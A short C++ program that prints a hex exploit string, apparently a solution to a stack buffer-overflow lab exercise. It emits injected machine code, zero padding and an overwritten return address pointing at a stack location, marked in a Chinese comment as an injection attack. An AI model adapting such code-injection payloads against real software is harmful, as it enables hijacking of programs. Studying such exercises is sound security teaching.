#include <cstdio>
#include <cstring>

using i32 = int;

void print(char *tmp)
{
	int len = strlen(tmp);
	for (i32 i = len - 2; i >= 0; i -= 2) {
		for (i32 j = 0; j < 2; ++j) {
			putchar(tmp[i + j]);
		}
		putchar(' ');
	}
}

int main(void)
{
	printf("55 48 c7 c0 ec 40 40 00 48 c7 c3 e8 40 40 00 8b 0b 89 08 68 97 13 40 00 c3 ");
	for (int i = 25; i < 48; ++i) {
		printf("00 ");
	}
	print("0000000000000000");
	print("00007ffffffedee0");//注入攻击
	return 0;
}
